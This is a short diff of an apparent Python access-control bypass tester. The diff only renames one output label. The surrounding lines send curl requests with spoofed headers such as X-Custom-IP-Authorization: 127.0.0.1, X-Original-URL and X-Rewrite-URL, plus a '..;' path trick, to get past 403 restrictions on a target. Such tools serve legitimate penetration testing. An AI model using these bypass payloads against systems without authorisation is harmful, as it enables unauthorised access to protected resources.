@@ -126,7 +126,7 @@ def main():
 		print("HEADER -> Referer : ",curl_fct(" -X GET -H \"Referer: "+test+"\"",test))
 		print("HEADER -> X-Custom-IP-Authorization: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
 		test=target+"/"+uri+"..\;"
-		print("HEADER -> X-Custom-IP-Authorization + ..;: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
+		print("HEADER -> X-Custom-IP-Authorization: ..;: ",curl_fct(" -X GET -H \"X-Custom-IP-Authorization: 127.0.0.1\"",test))
 		test=target+"/"
 		print("HEADER -> X-Original-URL: ",curl_fct(" -X GET -H \"X-Original-URL: /"+uri+"\"",test))
 		print("HEADER -> X-Rewrite-URL: ",curl_fct(" -X GET -H \"X-Rewrite-URL: /"+uri+"\"",test))
